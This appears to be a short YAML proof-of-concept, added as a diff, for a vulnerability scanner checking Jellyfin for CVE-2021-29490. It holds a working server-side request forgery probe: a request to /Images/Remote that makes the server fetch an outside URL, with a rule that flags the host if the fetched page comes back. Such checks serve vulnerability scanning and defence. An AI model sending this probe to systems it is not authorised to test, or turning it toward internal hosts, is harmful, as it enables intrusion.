@@ -1,0 +1,16 @@
+detail:
+  author: "\u66E6shen"
+  links:
+  - https://mp.weixin.qq.com/s/lZcjStsMKz-VeP-KjU2H7g
+expression: r0()
+manual: true
+name: poc-yaml-jellyfin-cve-2021-29490
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes("baidu.com"))
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /Images/Remote?imageUrl=http://baidu.com
+transport: http
